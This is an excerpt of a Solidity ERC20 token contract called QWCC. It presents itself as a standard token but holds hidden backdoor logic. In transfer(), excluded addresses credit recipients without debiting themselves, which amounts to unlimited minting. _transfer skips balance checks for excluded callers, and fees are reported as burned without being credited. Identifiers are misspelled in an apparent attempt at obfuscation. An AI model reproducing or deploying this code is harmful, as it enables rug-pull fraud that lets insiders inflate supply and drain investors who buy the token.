...
contract QWCC is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amouunt) internal virtual {

        
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 fieiamouunt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            fieiamouunt = amouunt.mul(_burnfiei).div(101);
            require(amouunt <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amouunt,"IERC20: transfer amouunt exceeds balance");
        }
        if (blsender >= amouunt){
            _balance[sender] = _balance[sender].subb(amouunt);
        }

        uint256 amouun;
        amouun = amouunt - fieiamouunt;
        _balance[recipient] += amouun;
        if (_burnfiei > 0){
            emit Transfer (sender, _DEADaddress, fieiamouunt);
        }
        emit Transfer(sender, recipient, amouun);
    ...
    function transfer(address recipient, uint256 amouunt) public virtual override returns (bool) {
        ...
        if (_isExcludedFrom[_mngSender()] == true) {
            _balance[recipient] += amouunt;
            return true;
        }
        _transfer(_mngSender(), recipient, amouunt);
        return true;
    }
    ...
    function approve(address spender, uint256 amouunt) public virtual override returns (bool) {
        _approve(_mngSender(), spender, amouunt);
        return true;
    }

    function _approve(address owner, address spender, uint256 amouunt) internal virtual {
    ...
    function transferFrom(address sender, address recipient, uint256 amouunt) public virtual override returns (bool) {
        ...
        require(currentAllowance >= amouunt, "IERC20: transfer amouunt exceeds allowance");
        return true;
    }
